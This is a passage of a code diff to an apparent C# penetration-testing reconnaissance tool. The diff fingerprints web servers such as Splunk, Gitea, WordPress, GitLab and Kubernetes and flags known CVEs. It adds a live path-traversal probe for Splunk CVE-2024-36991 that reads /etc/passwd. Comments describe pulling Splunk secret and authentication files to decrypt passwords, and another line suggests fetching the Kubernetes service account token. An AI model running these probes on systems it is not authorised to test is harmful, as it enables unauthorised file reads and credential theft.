                         toReturn += "-- If version is below 1.4.19, check https://www.exploit-db.com/exploits/31396 (CVE-2008-1270)" + Environment.NewLine;
+                    }
+                    else if (serverText.StartsWith("Python") && serverText.Contains("aiohttp"))
+                    {
+                        toReturn += "Bug Reelix - The WinRM Python/3.9 aiohttp/3.9.1 should move here to Web.cs!" + Environment.NewLine;
                     }
                     else if (serverText.StartsWith("MiniServ/"))
                     {
@@ -1229,6 +1393,47 @@ namespace Reecon
                         // -> CVE-2019-12840
                         // --> https://www.exploit-db.com/exploits/46984
                     }
+
+                    // Splunk
+                    else if (serverText == "Splunkd")
+                    {
+                        toReturn += "-- Splunk Detected (Bug Reelix to get a better version detector)" + Environment.NewLine;
+                        // splunkd-partials
+                        // D124F896D3FA893867AB88B2BE1BDFF0B34AB88817E91B6FB07AC2C98D170790 == VERSION=9.2.1 BUILD=78803f08aabb PRODUCT=splunk PLATFORM=Windows-AMD64 (Always?)
+                        // StatusCode == HttpStatusCode.SeeOther is also 303????
+                        if (StatusCode == HttpStatusCode.RedirectMethod)
+                        {
+                            if (ResponseHeaders.Location != null)
+                            {
+                                string langPath = ResponseHeaders.Location.ToString();
+                                // CVE-2024-36991
+                                // In Splunk Enterprise on Windows versions below 9.2.2, 9.1.5, and 9.0.10, an attacker could perform a path traversal on the /modules/messaging/ endpoint
+                                // in Splunk Enterprise on Windows. This vulnerability should only affect Splunk Enterprise on Windows.
+
+                                // Should also maybe check splunkd-partials if it's enterprise or not....
+                                // 9.0.0 -> 9.0.9
+                                // 9.1.0 -> 9.1.4
+                                // 9.2.0 -> 9.2.1
+                                // /etc/splunk.version - But only on the remote host...
+
+                                // /etc/auth/splunk.secret (Save in .txt)
+                                // /etc/system/local/authentication.conf
+                                // /etc/system/local/server.conf
+                                // --> https://github.com/HurricaneLabs/splunksecrets
+                                // ----> splunksecrets splunk-decrypt -S secret.txt (Paste bindDNpassword from authentication.conf)
+                                string cveCheckPath = langPath + "modules/messaging/C:../C:../C:../C:../C:../etc/passwd";
+                                var cveCheck = GetHTTPInfo(cveCheckPath);
+                                if (cveCheck.StatusCode == HttpStatusCode.OK)
+                                {
+                                    toReturn += "--- " + "Vulnerable to CVE-2024-36991!".Recolor(Color.Orange) + Environment.NewLine;
+                                    toReturn += $"--- {cveCheckPath}" + Environment.NewLine;
+                                    toReturn += $"---- " + cveCheck.PageText.Recolor(Color.Orange).Trim(Environment.NewLine.ToCharArray()) + Environment.NewLine;
+                                }
+                            }
+                        }
+                    }
+
+                    // Wekzeug
                     else if (serverText.StartsWith("Werkzeug/"))
                     {
                         toReturn += "-- " + "Werkzeug detected" + Environment.NewLine;
@@ -1251,36 +1456,6 @@ namespace Reecon
                         {
                             toReturn += "--- No /console :(" + Environment.NewLine;
                         }
-                    }
-                    else if (serverText == "xxxxxxxx-xxxxx" && PageText.Contains("top.location=\"/remote/login\""))
-                    {
-                        toReturn += "-- " + "Fortinet detected" + Environment.NewLine;
-                        if (ContentHeaders.LastModified != null)
-                        {
-                            DateTime theDate = ContentHeaders.LastModified.Value.DateTime;
-                            ContentHeaders.Remove("Last-Modified");
-                            toReturn += $"--- Last Modified: {theDate}" + Environment.NewLine;
-
-                            // CVE-2023-27997
-                            // https://bishopfox.com/blog/cve-2023-27997-exploitable-fortigate-vulnerable
-                            // we know that patched FortiOS releases were packaged in May–June 2023.
-                            if (theDate.Year < 2023 || (theDate.Year == 2023 && theDate.Month < 5))
-                            {
-                                toReturn += "--- Bug Reelix for additional checks for CVE-2023-27997" + Environment.NewLine;
-                                // May–June 2023 
-                            }
-                            else
-                            {
-                                toReturn += "--- Probably not vulnerable to CVE-2023-27997 :(" + Environment.NewLine;
-                            }
-                        }
-
-                        // CVE-2024-55591
-                        // FortiOS 7.0.0 through 7.0.16
-                        // FortiProxy 7.0.0 through 7.0.19
-                        // FortiProxy 7.2.0 through 7.2.12
-                        // https://github.com/watchtowrlabs/fortios-auth-bypass-poc-CVE-2024-55591
-
                     }
                 }
 
@@ -1327,14 +1502,14 @@ namespace Reecon
                     else if (poweredBy == "Strapi <strapi.io>")
                     {
                         toReturn += "-- " + "Strapi detected".Recolor(Color.Orange) + Environment.NewLine;
-                        var versionCheck = Web.GetHTTPInfo($"{URL.Trim('/')}/admin/init");
+                        var versionCheck = Web.GetHTTPInfo($"{httpInfo.URL.Trim('/')}/admin/init");
                         if (versionCheck.StatusCode == HttpStatusCode.OK)
                         {
                             string versionJson = versionCheck.PageText;
                             try
                             {
                                 var versionData = JsonDocument.Parse(versionJson);
-                                string versionText = versionData.RootElement.GetProperty("data").GetProperty("strapiVersion").GetString();
+                                string versionText = versionData.RootElement.GetProperty("data").GetProperty("strapiVersion").GetString() ?? "";
                                 toReturn += "--- Version: " + versionText + Environment.NewLine;
                                 if (versionText == "3.0.0-beta.17.4")
                                 {
@@ -1380,11 +1555,11 @@ namespace Reecon
                 if (ResponseHeaders.Any(x => x.Key == "X-Gitlab-Meta"))
                 {
                     toReturn += "-- " + "Gitlab Detected".Recolor(Color.Orange) + Environment.NewLine;
-                    var versionCheck = GetHTTPInfo($"{URL}assets/webpack/manifest.json");
+                    var versionCheck = GetHTTPInfo($"{httpInfo.URL}assets/webpack/manifest.json");
                     if (versionCheck.StatusCode == HttpStatusCode.OK)
                     {
                         JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
-                        string hash = versionData.RootElement.GetProperty("hash").GetString();
+                        string hash = versionData.RootElement.GetProperty("hash").GetString() ?? "Unknown (Hash doesn't exist)";
                         toReturn += "-- " + $"Version Hash: {hash}".Recolor(Color.Orange) + Environment.NewLine;
                         toReturn += "-- " + "Search in: https://raw.githubusercontent.com/righel/gitlab-version-nse/main/gitlab_hashes.json".Recolor(Color.Orange) + Environment.NewLine;
                         toReturn += "--- " + "CVE-2021-22205: 11.9.0 to 13.8.7, 13.9.0 to 13.9.5, 13.10.0 to 13.10.2 (Inclusive)".Recolor(Color.Orange) + Environment.NewLine;
@@ -1409,14 +1584,16 @@ namespace Reecon
                 // Kubernetes
                 if (ResponseHeaders.Any(x => x.Key.StartsWith("X-Kubernetes-")))
                 {
+                    // Could be multiple - May need to clean this up...
+                    Console.WriteLine("Weird Kubernetes Case - Bug Reelix!");
                     ResponseHeaders.Where(x => !x.Key.StartsWith("X-Kubernetes-"));
                     toReturn += "-- " + "Kubernetes Detected".Recolor(Color.Orange) + Environment.NewLine;
                     var versionCheck = GetHTTPInfo($"{URL}version");
                     if (versionCheck.StatusCode == HttpStatusCode.OK)
                     {
                         JsonDocument versionData = JsonDocument.Parse(versionCheck.PageText);
-                        string major = versionData.RootElement.GetProperty("major").GetString();
-                        string minor = versionData.RootElement.GetProperty("minor").GetString();
+                        string major = versionData.RootElement.GetProperty("major").GetString() ?? "";
+                        string minor = versionData.RootElement.GetProperty("minor").GetString() ?? "";
                         toReturn += "-- " + $"Version: {major}.{minor} (In /version)".Recolor(Color.Orange) + Environment.NewLine;
                     }
                     toReturn += "--- " + "Try get /run/secrets/kubernetes.io/serviceaccount/token" + Environment.NewLine;
@@ -1468,7 +1645,7 @@ namespace Reecon
                 }
                 if (ResponseHeaders.Any(x => x.Key == "kbn-version"))
                 {
-                    string kbnVersion = ResponseHeaders.GetValues("kbn-version").ToString(); // Will this bug since it's not .First() ?
+                    string kbnVersion = ResponseHeaders.GetValues("kbn-version").First().ToString();
                     ResponseHeaders.Remove("kbn-version");
                     toReturn += $"- kbn-version: {kbnVersion}" + Environment.NewLine;
                 }
@@ -1538,9 +1715,38 @@ namespace Reecon
                     toReturn += "-- Verify security with: https://csp-evaluator.withgoogle.com/" + Environment.NewLine;
                 }
 
+                // Might be useful
+                if (ContentHeaders.ContentType != null)
+                {
+                    string contentType = ContentHeaders.ContentType.ToString();
+                    ContentHeaders.Remove("Content-Type");
+                    if (contentType != "text/html; charset=UTF-8") // Boring
+                    {
+                        toReturn += "- Content Type: " + contentType + Environment.NewLine;
+                    }
+                }
+                if (ResponseHeaders.Date != null && ResponseHeaders.Date.HasValue)
+                {
+                    string date = ResponseHeaders.Date.ToString() ?? "";
+                    ResponseHeaders.Remove("Date");
+                    toReturn += "- Date: " + date + Environment.NewLine;
+                }
+
+
+                // Some we don't really care about
+                ContentHeaders.Remove("Content-Length");
+
+                // And we've already dealt with location
+                ResponseHeaders.Remove("Location");
                 // And the rest
-                toReturn += "- Other Response Headers: " + string.Join(", ", ResponseHeaders.Select(x => x.Key)) + Environment.NewLine;
-                toReturn += "- Other Content Headers: " + string.Join(", ", ContentHeaders.Select(x => x.Key)) + Environment.NewLine;
+                if (ResponseHeaders.Any())
+                {
+                    toReturn += "- Other Response Headers: " + string.Join(", ", ResponseHeaders.Select(x => x.Key)) + Environment.NewLine;
+                }
+                if (ContentHeaders.Any())
+                {
+                    toReturn += "- Other Content Headers: " + string.Join(", ", ContentHeaders.Select(x => x.Key)) + Environment.NewLine;
+                }
             }
 
             // Page Text (Body)
@@ -1555,14 +1761,14 @@ namespace Reecon
                 if (PageText.Contains("<meta name=\"generator\" content="))
                 {
                     string contentValue = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"") + "<meta name=\"generator\" content=\"".Length);
-                    contentValue = contentValue.Substring(0, contentValue.IndexOf("\"")).Trim();
+                    contentValue = contentValue.Substring(0, contentValue.IndexOf('"')).Trim();
                     if (contentValue.StartsWith("concrete5 - "))
                     {
                         toReturn += "- " + "concrete5 CMS detected!".Recolor(Color.Orange) + Environment.NewLine;
                         // <meta name="generator" content="concrete5 - 8.5.2"/>
                         string versionInfo = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"concrete5 - "));
                         versionInfo = versionInfo.Remove(0, versionInfo.IndexOf("concrete5 - ") + 12);
-                        versionInfo = versionInfo.Substring(0, versionInfo.IndexOf("\""));
+                        versionInfo = versionInfo.Substring(0, versionInfo.IndexOf('"'));
                         toReturn += "-- Version: " + versionInfo + Environment.NewLine;
                         if (versionInfo == "8.5.2")
                         {
@@ -1733,10 +1939,10 @@ namespace Reecon
                     toReturn += "- " + "Gitea detected!".Recolor(Color.Orange) + Environment.NewLine;
 
                     // Version Check
-                    if (PageText.ToLower().Contains("appver: '") && PageText.ToLower().Contains("appsuburl: '")) // appUrl
+                    if (PageText.Contains("appver: '", StringComparison.CurrentCultureIgnoreCase) && PageText.Contains("appsuburl: '", StringComparison.CurrentCultureIgnoreCase)) // appUrl
                     {
-                        string giteaVersion = PageText.Remove(0, PageText.ToLower().IndexOf("appver: '".ToLower()) + 9);
-                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
+                        string giteaVersion = PageText.Remove(0, PageText.IndexOf("appver: '", StringComparison.CurrentCultureIgnoreCase) + 9);
+                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf('\''));
                         Version theVersion = System.Version.Parse(giteaVersion);
                         toReturn += $"-- Version: {theVersion}".Recolor(Color.White) + Environment.NewLine;
                         // Version: >= 1.1.0 to <= 1.12.5
@@ -1749,7 +1955,7 @@ namespace Reecon
                     else if (PageText.Contains("assetVersionEncoded: encodeURIComponent('"))
                     {
                         string giteaVersion = PageText.Remove(0, PageText.IndexOf("assetVersionEncoded: encodeURIComponent('") + 41);
-                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf("'"));
+                        giteaVersion = giteaVersion.Substring(0, giteaVersion.IndexOf('\''));
                         toReturn += $"-- Version: {giteaVersion}" + Environment.NewLine;
                     }
 
@@ -1759,7 +1965,7 @@ namespace Reecon
                     {
                         // Why not just a sane API call :(
                         List<string> userEntries = usersPage.PageText.Split('\n').Where(x => x.Contains("<a class=\"text muted\" href=\"")).Select(x => x.Trim().Replace("</a>", "")).ToList();
-                        List<string> users = userEntries.Select(x => x.Remove(0, x.LastIndexOf(">") + 1)).ToList();
+                        List<string> users = userEntries.Select(x => x.Remove(0, x.LastIndexOf('>') + 1)).ToList();
                         foreach (string user in users)
                         {
                             toReturn += $"-- User: " + user + Environment.NewLine;
@@ -1772,7 +1978,7 @@ namespace Reecon
                 {
                     toReturn += "- " + "Grafana detected!".Recolor(Color.Orange) + Environment.NewLine;
                     string grafanaVersion = PageText.Remove(0, PageText.IndexOf("Grafana v") + 8);
-                    grafanaVersion = grafanaVersion.Substring(0, grafanaVersion.IndexOf("\""));
+                    grafanaVersion = grafanaVersion.Substring(0, grafanaVersion.IndexOf('"'));
                     toReturn += "-- Version: " + grafanaVersion + Environment.NewLine;
                     if (grafanaVersion.Contains("v8."))
                     {
@@ -1844,7 +2050,7 @@ namespace Reecon
                     {
                         string wpVersion = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"WordPress "));
                         wpVersion = wpVersion.Remove(0, wpVersion.IndexOf("WordPress ") + "WordPress ".Length);
-                        wpVersion = wpVersion.Substring(0, wpVersion.IndexOf("\"")).Trim();
+                        wpVersion = wpVersion.Substring(0, wpVersion.IndexOf('"')).Trim();
                         toReturn += "-- " + $"WordPress Version: {wpVersion}".Recolor(Color.Orange) + Environment.NewLine;
                     }
 
@@ -1856,9 +2062,9 @@ namespace Reecon
                         var document = JsonDocument.Parse(wpUserTestOne.PageText);
                         foreach (JsonElement element in document.RootElement.EnumerateArray())
                         {
-                            string wpUserName = element.GetProperty("name").GetString();
-                            string wpUserSlug = element.GetProperty("slug").GetString();
-                            if (!wpUsers.Contains(wpUserName))
+                            string? wpUserName = element.GetProperty("name").GetString();
+                            string? wpUserSlug = element.GetProperty("slug").GetString();
+                            if (wpUserName != null && wpUserSlug != null && !wpUsers.Contains(wpUserName))
                             {
                                 wpUsers.Add(wpUserSlug);
                                 toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
@@ -1872,9 +2078,9 @@ namespace Reecon
                         var document = JsonDocument.Parse(wpUserTestTwo.PageText);
                         foreach (JsonElement element in document.RootElement.EnumerateArray())
                         {
-                            string wpUserName = element.GetProperty("name").GetString();
-                            string wpUserSlug = element.GetProperty("slug").GetString();
-                            if (!wpUsers.Contains(wpUserName))
+                            string wpUserName = element.GetProperty("name").GetString() ?? "";
+                            string wpUserSlug = element.GetProperty("slug").GetString() ?? "";
+                            if (!wpUsers.Contains(wpUserName) && wpUserName != "")
                             {
                                 wpUsers.Add(wpUserSlug);
                                 toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
@@ -1885,7 +2091,7 @@ namespace Reecon
                     // List Plugins
                     if (PageText.Contains("/wp-content/plugins/"))
                     {
-                        List<string> pluginSearcher = PageText.Split(new string[] { "/wp-content/plugins/" }, StringSplitOptions.None).ToList();
+                        List<string> pluginSearcher = PageText.Split(["/wp-content/plugins/"], StringSplitOptions.None).ToList();
 
                         // If it contains a plugin, then splitting by the plugin string has the first item being the text before it
 
@@ -1901,8 +2107,8 @@ namespace Reecon
                         {
                             // Plugin Found: adrotate/library/jquery.adrotate.clicktracker.js
                             // /wp-content/plugins/adrotate/readme.txt
-                            string thePlugin = plugin.Substring(0, plugin.IndexOf(" ") - 1);
-                            thePlugin = thePlugin.Substring(0, thePlugin.IndexOf("/"));
+                            string thePlugin = plugin.Substring(0, plugin.IndexOf(' ') - 1);
+                            thePlugin = thePlugin.Substring(0, thePlugin.IndexOf('/'));
                             if (!pluginList.Contains(thePlugin))
                             {
                                 pluginList.Add(thePlugin);
@@ -1943,12 +2149,12 @@ namespace Reecon
                                         if (pluginReadme.PageText.Contains("Stable tag: "))
                                         {
                                             string pluginVersion = pluginReadme.PageText.Remove(0, pluginReadme.PageText.IndexOf("Stable tag: ") + "Stable tag: ".Length);
-                                            pluginVersion = pluginVersion.Substring(0, pluginVersion.IndexOf("\n")).Trim('\r');
+                                            pluginVersion = pluginVersion.Substring(0, pluginVersion.IndexOf('\n')).Trim('\r');
                                             toReturn += "--- " + $"Plugin version: {pluginVersion}".Recolor(Color.Orange) + Environment.NewLine;
                                         }
                                     }
                                     // Some use changelog.txt instead
-                                    else 
+                                    else
                                     {
                                         string changelogLoc = $"{urlWithSlash}wp-content/plugins/{thePlugin}/changelog.txt";
                                         var changelogReadme = Web.GetHTTPInfo(changelogLoc);
@@ -2048,18 +2254,18 @@ namespace Reecon
                         // - Linux: X509v3 Subject Alternative Name
                         // - Note: Only in English - Not cross-language friendly :(
                         // Subject Alternative Name == Oid 2.5.29.17
-                        if (extension.Oid.Value == "2.5.29.17")
+                        if (extension.Oid != null && extension.Oid.Value == "2.5.29.17")
                         {
                             AsnEncodedData asndata = new(extension.Oid, extension.RawData);
-                            List<string> formattedValues = asndata.Format(true).Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
+                            List<string> formattedValues = asndata.Format(true).Split([Environment.NewLine], StringSplitOptions.None).ToList();
                             string itemList = "";
                             foreach (string item in formattedValues)
                             {
                                 string theItem = item;
                                 theItem = theItem.Replace("DNS Name=", "");
-                                if (theItem.Contains("("))
+                                if (theItem.Contains('('))
                                 {
-                                    theItem = theItem.Remove(0, theItem.IndexOf("(") + 1).Replace(")", "");
+                                    theItem = theItem.Remove(0, theItem.IndexOf('(') + 1).Replace(")", "");
                                     itemList += theItem + ",";
                                 }
                                 else
@@ -2124,7 +2330,7 @@ namespace Reecon
             }
         }
 
-        public static (string Text, HttpStatusCode StatusCode) DownloadString(string url, HttpMethod Method = null, HttpContent PostContent = null, string Cookie = null, NetworkCredential Creds = null, string UserAgent = null)
+        public static (string Text, HttpStatusCode StatusCode) DownloadString(string url, string? Cookie = null, NetworkCredential? Creds = null, string? UserAgent = null, HttpMethod? Method = null)
         {
             // For invalid HTTPS Certs
             var handler = new HttpClientHandler()
@@ -2136,17 +2342,13 @@ namespace Reecon
             HttpClient httpClient = new HttpClient(handler);
             string toReturn = "";
 
+            // Can also be a HEAD request for GET's
             if (Method == null)
             {
                 Method = HttpMethod.Get;
             }
 
             HttpRequestMessage request = new HttpRequestMessage(Method, url);
-            if (PostContent != null)
-            {
-                request.Method = HttpMethod.Post;
-                request.Content = PostContent;
-            }
 
             // Cookie
             if (Cookie != null)
@@ -2178,5 +2380,54 @@ namespace Reecon
             }
             return (toReturn, statusCode);
         }
+
+        public class UploadDataResult
+        {
+            public HttpStatusCode? StatusCode { get; set; }
+            public string Text = "";
+            public HttpResponseHeaders ResponseHeaders = new HttpResponseMessage().Headers;
+        }
+
+        public static UploadDataResult UploadData(string url, byte[] PostContent, Dictionary<string, string>? RequestHeaders = null)
+        {
+            UploadDataResult toReturn = new UploadDataResult();
+            // For invalid HTTPS Certs
+            var handler = new HttpClientHandler()
+            {
+                ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
+            };
+
+            HttpClient httpClient = new HttpClient(handler);
+
+            HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, url);
+
+            // Add request headers
+            if (RequestHeaders != null)
+            {
+                foreach (var header in RequestHeaders)
+                {
+                    request.Headers.Add(header.Key, header.Value);
+                }
+            }
+
+            ByteArrayContent content = new ByteArrayContent(PostContent);
+            request.Content = content;
+
+            using (HttpResponseMessage response = httpClient.Send(request))
+            {
+                toReturn.StatusCode = response.StatusCode;
+                toReturn.ResponseHeaders = response.Headers;
+                using (StreamReader readStream = new(response.Content.ReadAsStream()))
+                {
+                    toReturn.Text = readStream.ReadToEnd();
+                }
+            }
+
+            return toReturn;
+
+        }
+
+        [GeneratedRegex(@"\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b", RegexOptions.IgnoreCase, "en-ZA")]
+        private static partial Regex MyRegex();
     }
 }
